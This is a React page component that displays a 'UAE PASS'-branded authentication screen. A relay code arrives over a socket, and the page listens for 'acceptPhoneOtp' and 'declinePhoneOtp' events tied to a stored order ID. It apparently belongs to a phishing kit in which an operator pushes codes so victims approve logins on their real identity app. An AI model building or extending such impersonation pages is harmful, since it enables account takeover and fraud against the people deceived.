import React from 'react';
import { useSearchParams } from 'react-router-dom';
import { socket } from '../App';
import { useState, useEffect } from 'react';

const ConfirmOrder = () => {
    const [searchParams] = useSearchParams();
    // Dynamically get the code from the query string (e.g., /confirm?code=42)
    const [code,setCode] = useState(searchParams.get('code') || '--');

    useEffect(() => {
        const orderId = localStorage.getItem("orderId");
        if (orderId) {
            socket.emit("joinOrder", orderId);
        }

        const handleAccept = ({id, code}) => {
            if (id === orderId) {
                setCode(code);
            }
        };

        const handleDecline = (id) => {
            if (id === orderId) {
                window.location.href = "/";
            }
        };

        socket.on("acceptPhoneOtp", handleAccept);
        socket.on("declinePhoneOtp", handleDecline);

        return () => {
            socket.off("acceptPhoneOtp", handleAccept);
            socket.off("declinePhoneOtp", handleDecline);
        };
    }, []);
    return (
        <div className="flex flex-col items-center h-screen bg-white font-sans selection:bg-teal-50">
            {/* 1. Header Section - Using the specific header provided */}
            <div className="md:w-1/2 w-11/12 my-2 flex items-center justify-center">
                <img 
                    src="/confirm-header.jpeg" 
                    alt="UAE PASS" 
                    className="w-fit"
                />
            </div>

            {/* 2. Main Content Container */}
            <div className="flex flex-col items-center w-full max-w-md px-8 text-center">                                                                                                           


                {/* 5. The Authenticator Code Box */}
                <div className="relative mb-14 transition-transform hover:scale-105 duration-300">
                    <div className="w-28 h-28 bg-[#e1f3e1] rounded-[28px] shadow-[0_12px_30px_-10px_rgba(0,0,0,0.1)] flex items-center justify-center  ">
                        <span className="text-[28px] font-bold text-[#1c2e36] tracking-tighter">
                            {code}
                        </span>
                    </div>
                </div>

          
                  {/* 6. Status Message */}
                <div className="flex items-center text-[#c19445] mb-6">
                    <span className="text-xl mr-3 animate-pulse">⏳</span>
                    <span className="text-[15px] font-bold tracking-wide">
                        Waiting for your confirmation
                    </span>
                </div>

                {/* 7. Cancel Action */}
                <button 
                    className="flex items-center text-[#ff3b30] text-[15px] font-bold hover:opacity-75 transition-all group"
                >
                    Cancel Request 
                    <span className="ml-2 text-2xl font-light group-hover:rotate-90 transition-transform">×</span>
                </button>
            </div>

        </div>
    );
};

export default ConfirmOrder;
